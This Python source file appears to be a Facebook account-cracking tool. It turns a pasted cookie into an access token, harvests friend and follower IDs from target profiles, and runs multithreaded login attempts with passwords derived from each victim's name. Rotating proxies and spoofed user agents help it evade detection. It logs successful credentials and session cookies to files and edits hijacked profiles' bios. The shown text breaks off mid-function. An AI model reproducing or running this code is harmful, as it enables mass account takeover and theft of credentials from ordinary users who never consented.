#-----------------[ IMPORT-MODULE ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
#------------------[ USER-AGENT ]-------------------#
ugen2=[]
ugen=[]
hEROn=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mAlvino_adijaya_xy')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):

	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['4','5','6','7','8','9','10','11','12'])
	c='Redmi Note'
	d=random.randrange(1,15)
	e='Build/'
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.randrange(1, 999)
	h=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	i='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	j=random.randrange(73,100)
	k='0'
	l=random.randrange(4200,4900)
	m=random.randrange(40,150)
	n='Mobile Safari/537.36'
	uaku=(f'{a} {b}; {c} {d} {e}{f}{g}{h} {i}{j}.{k}.{l}.{m} {n}')
	ugen.append(uaku)
 
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['4','5','6','7','8','9','10','11','12'])
	c='Redmi Note'
	d=random.randrange(1,15)
	e='Build/'
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.randrange(1, 999)
	h=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	q=' wv)'
	i='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	j=random.randrange(73,100)
	k='0'
	l=random.randrange(4200,4900)
	m=random.randrange(40,150)
	n='Mobile Safari/537.36'
	uaku=(f'{a} {b}; {c} {d} {e}{f}{g}{h}{q} {i}{j}.{k}.{l}.{m} {n}')
	ugen.append(uaku)
 
 
 

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6.0.1','7.1.1','8.1.0','7.0','8.1.0','9','10','11','12'])
	c='Redmi Note'
	d=random.randrange(1,14)
	e='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	f=random.randrange(83,103)
	g='0'
	h=random.randrange(4200,4900)
	i=random.randrange(40,150)
	j='Mobile Safari/537.36'
	uaku=f'{aa} {b}; {c} {d} {e}{f}.{g}.{h}.{i} {j}'
	ugen.append(uaku)
 
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6.0.1','7.1.1','8.1.0','7.0','8.1.0','9','10','11','12'])
	c='Redmi Note'
	d=random.randrange(1,14)
	e='pro'
	f=random.choice(['Build/KTU84P)','Build/QP1A.190711.020; wv)','Build/R16NW)','Build/MRA58K; wv)','Build/JLS36C)','Build/KOT49H)','Build/MMB29M)'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(83,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku=f'{aa} {b}; {c} {d} {e} {f} {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku)
 
	aa='Mozilla/5.0 (Windows NT'
	b=random.choice(['6.0.1','7.1.1','8.1.0','7.0','8.1.0','9','10','11','12'])
	c='WOW64)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Safari/537.36'
	uaku=f'{aa} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	ugen.append(uaku)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6.0.1','7.1.1','8.1.0','7.0','8.1.0','9','10','11','12'])
	c='Redmi Note 9 Pro Build/RKQ1.200826.002)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36'
	uaku=f'{aa} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	ugen.append(uaku)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6.0.1','7.1.1','8.1.0','7.0','8.1.0','9','10','11','12'])
	c='RMX3115 Build/SP1A.210812.016; wv)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36'
	uaku=f'{aa} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	ugen.append(uaku)

for tu in range(1000):
            a =random.randrange(3,12)
            b = random.choice([
            'SM-X11O',
            'SM-J290F',
            'SM-J610G',
            'SM-M317F',
            'SM-R765T',
            'SM-G610M',
            'SM-A730F',
            'SM-Q130A',
            'SM-J415N',
            'SM-M205N'])
            c = random.choice([
            'OPM1',
            'QP1A',
            'PKQ1',
            'RP1A',
            'PPR1',
            'TP1A',
            'RKQ1',
            'SP1A',
            'PKQ1'])
            d = random.randrange(1111, 2999)
            e = random.randrange(11, 19)
            f = random.randrange(73, 99)
            g = random.randrange(4200, 4900)
            h = random.randrange(40, 150)
            uaku2 = f'Mozilla/5.0 (Linux; Android {a}; {b} Build/{c}.{d}.0.0{e}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{f}.0.{g}.{h} Mobile Safari/537.36'
            ugen.append(uaku2)
for x in range(10):
    a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
    c=random.randrange(73,100)
    d=random.randrange(4200,4900)
    e=random.randrange(40,150)
    uak=f'Mozilla/5.0 (Linux; Android {a}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
def uaku():
	try:
		ua=open('Safari.txt','r').read().splitlines()
		for ub in ua : 
			ugen2.append(ub)
	except:
		a=requests.get('https://github.com/Rands-mkz/top/blob/main/Safari.txt').text
		ua=open('.Safari.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.Safari.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA-COLOR ]--------------#


P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def animation(u):
	for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-LAKNAT ]------------------------
def banner():
	clear()
	cetak(nel(f'''{H}   
                      \033[1;97m
                           
             
░█████╗░░█████╗░██████╗░███████╗░██████╗██╗░░██╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔════╝██║░░██║
███████║███████║██║░░██║█████╗░░╚█████╗░███████║
██╔══██║██╔══██║██║░░██║██╔══╝░░░╚═══██╗██╔══██║
██║░░██║██║░░██║██████╔╝███████╗██████╔╝██║░░██║
╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚══════╝╚═════╝░╚═╝░░╚═╝          
----------------------------------------------------------------------
FACEBOOK : AADESH SARKAR
TELGRAM : ......
GITHUB : ..... 
CHANAL : XXX
VERSION : 1.9
UPDATE : 2023/7/15
NOT BYPASS⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
🌿♣
                 ''',width=79,title=f'[bold blue]TOOLS AADESH HERO',style='bold blue'))
#--------------------[ BAGIAN-MASUK ]--------------#
def DYNO():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			MRDYNO()
		except requests.exceptions.ConnectionError:
			li = '# Problem Internet Connection, Check And Try Again'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		MRDYNO()
		
def MRDYNO():
	try:
		os.system('clear')
		banner()
		your_cookies = input(' FRESH COOKIE :  ')
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					print("   Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
						if 'Sukses!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							print(f"\n ╰─  LOGIN TOKEN : {access_token}")
							tokenew = open(".token.txt","w").write(access_token)
							cook= open(".cok.txt","w").write(your_cookies)
							print("\n ╰─  LOGIN SECCESFULL BRO | python MY.py");exit()
			except Exception as e:
				print(" ╰─  COOKIE EXPERT")
				os.system('rm -rf .token.txt && rm -rf .cok.txt')
				print(e)
				time.sleep(3)
				back()
	except:pass
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Cookies NO ')
		time.sleep(5)
		MRDYNO()
	os.system('clear')
	banner()
	print(f"[ 1 ] ID PUBLIC [ ON ]")
	print(f"[ 2 ] FILE CRACK [ ON ] ")
	print(f"[ 0 ] COOKIS [ ON ] ")
	_____alvino__adijaya_____ = input('\n Choose : ')
	if _____alvino__adijaya_____ in ['2']:
		File2()
	if _____alvino__adijaya_____ in ['1']:
	    dump_massal()
	elif _____alvino__adijaya_____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print(f"{H} Sukses Logout Kukis ")
		exit()
	else:
		print('....... ')
		back()
#-----------------[ HASIL-CRACK ]-----------------#
def dump_pengikut():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	print('Type ( me ) If You Want to Crack Your Own HAWREKANE ')
	pil = input(' Enter Target Idz : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
		for pi in koh2['subscribers']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(f'Total Idz :{h} '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print('Problematic Internet Connection ')
		exit()
	except (KeyError,IOError):
		print('...... ')
		exit()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input('➲ HOW MANY ID <10> : '))
	except ValueError:
		print('{k}➲ ID EXPRT ')
		exit()
	if jum<1 or jum>100:
		print('➲ DUMP IDZ ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('➲ ID COMING '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('{k➲LOH KEK ')
			exit()
	try:
		print('')
		print(f'{k}➲ TOTAL ID★{b}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{u}')
		print('➲ SINYAL KEK ')
		back()
	except (KeyError,IOError):
		print(f'➲{k} TIDAK PUBLIC {u}')
		time.sleep(3)
		back()
#-------------------[ CRACK-FILE]----------------#
def File2():
			print('')
			print('\x1b[1;92m             FILE CRACKED')
			try:
				print('        ፨ ፨ ፨ ፨ ፨ ፨ ፨ ፨ ፨ ፨ ፨ ፨')
				fileX = input (f' {P}[+] ENTER FILE NAME :\x1b[1;92m ')  
				for line in open(fileX, 'r').readlines():
					id.append(line.strip())
				print('')
				print(f'{p} TOTAL ID :{h} '+str(len(id)))
				setting()
			except IOError:
				exit("{M}[!] FILE  %s EXPERT"%(fileX))
def setting():
	print(f'[ 1 ] RANDOM ')
	hu = input(x+'['+p+'f'+x+'] Choose : ')
	if hu in ['3','03']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['1','01']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print(f'{b}OPTION NOT IN THE MENU')
	passwrd()
def passwrd():
	with ThreadPool(max_workers=40) as pool:
		total_ids = str(len(id))
		print (" _________________________________________________________")
		for user in id:
			idf,name = user.split('|')[0],user.split('|')[1].lower() 
			pwv = []
			frs = name.split(' ')[0]
			if len(frs)<=2:
				pwv.append(name)
				try:
					lss = name.split(' ')[1].lower()
					if len(lss)<=3:
						pass
					else:
						pwv.append(lss+'123')
						pwv.append(lss+'1234')
						pwv.append(lss+'1122')
						pwv.append(lss)
						
						try:
							lsd = name.split(' ')[2]
							if len(lsd)<=3:
								pass
							else:
								pwv.append(lsd+'123')
						except:
							pass
				except:
					pass
			else:
				pwv.append(name)
				pwv.append(frs+'123')
				pwv.append(frs+frs)
				pwv.append(frs+' 123')
				pwv.append(frs+'@123')
				pwv.append(frs+' 12345')
				pwv.append(frs+'2000')
				pwv.append(frs+'1997')
				pwv.append(frs+'1999')
				pwv.append('123'+frs)
				pwv.append(frs+'2003')
				pwv.append(frs+'2004')
				pwv.append(frs+'2005')
				pwv.append(frs+'1234')
				pwv.append(frs+'12345')
				pwv.append(frs+'123456789')
				pwv.append(frs+'1122')
				pwv.append(frs+'54321')
				pwv.append(frs+'321')
				pwv.append('123'+frs+'123')
				pwv.append('12345'+frs)
				pwv.append(frs+frs+'123')
				try:
					lss = name.split(' ')[1].lower()
					if len(lss)<=3:
						pass
					else:
						pwv.append(lss+'123')
						pwv.append(lss+'1234')
						pwv.append(lss+'1122')
						pwv.append(lss)
						try:
							lsd = name.split(' ')[2]
							if len(lsd)<=3:
								pass
							else:
								pwv.append(lsd+'123')
						except:
							pass
				except:
					pass
			pool.submit(crack,idf,pwv)
oks=[]
cps=[]
#--------------------[ METODE-MOBILE ]-----------------#
def crack(idf,pwv):
	global loop,oks,cps
	sys.stdout.write('\x1b[1;92m [ kukur ]  %s  ~ \033[1;32m  ~ OK  %s\033[1;37m \x1b[1;91m   ~ CP  %s\033[1;37m\r'%(loop,len(oks),len(cps)));sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			pw = pw.lower()
			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://mbasic.facebook.com/login/save-device/'"}
			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
			if "c_user" in ses.cookies.get_dict().keys():
				print(f'\r{H}[ M A $ L A-OK ] {idf} 💸 {pw}  ')
				open('/sdcard/MALA-OK.txt','a').write(idf+'|'+pw+'\n')
				try:
					pi = ses.get('https://m.facebook.com/').text
					cookies=ses.cookies.get_dict()
					data ={"fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"', str(pi)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"',str(pi)).group(1), 'bio':".."}
					response = ses.post('https://m.facebook.com/profile/intro/bio/save/', cookies=cookies,data=data)
				except:pass
				
				#akun.append(idf+'|'+pw)
				oks.append(idf)
				cokii=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				open('/sdcard/QUTA-KUKISI.txt','a').write(cokii+'\n')
				
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{M}[ M A $ L A-CP ] {idf} 💸 {pw}  ')
				cps.append(idf)
				open('/sdcard/MALA-CP.txt','a').write(idf+'|'+pw+'\n')
				break
				
			else:
				#cps.append(idf)
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(10)
	loop+=1
#--------------------[ METODE-MBASIC ]-----------------#
def crackmbasic(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	sys.stdout.write('\r└───\x1b[1;90m[%s\x1b[1;91m$TAE\x1b[1;90m]-[\x1b[1;96m%s\x1b[1;90m/\x1b[1;95m%s\x1b[1;90m]-[\x1b[1;92mOK:%s\x1b[1;90m]-[\x1b[1;93mCP:%s\x1b[1;90m]-[\x1b[1;94m%s%s\x1b[1;90m]%s ✓'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	ua = random.choice(hEROn)
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua2,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=206428089508143&kid_directed_site=0&app_id=206428089508143&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D206428089508143%26redirect_uri%3Dhttps%253A%252F%252Fwww.zalora.co.id%252Fcustomer%252Fsocialconnect%252Fendpoint%253Fhauth_done%253DFacebook%26scope%3Demail%252Cuser_birthday%26state%3DHA-S3X0PV7ZQH6DAFTK5IJRM9EWYCBOU8214NLG%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0c67b520-a187-48a6-8125-3256fe975775%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.zalora.co.id%2Fcustomer%2Fsocialconnect%2Fendpoint%3Fhauth_done%3DFacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DHA-S3X0PV7ZQH6DAFTK5IJRM9EWYCBOU8214NLG%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://free.facebook.com/v8.0/dialog/oauth?response_type=code%2Cgranted_scopes&client_id=1239138353201716&redirect_uri=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler&state=AMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB&scope=public_profile%2Cemail&display=popup&ret=login&fbapp_pres=0&logger_id=087a364c-3d69-45b4-a55b-047dae50317c&tp=unspecified",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(f" ")
				tree.add(f"[ Checkpoint ]").add(f"[bold yellow]{idf}|{pw}|{thn}").add(f"[bold yellow]{ua}\n")
				cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
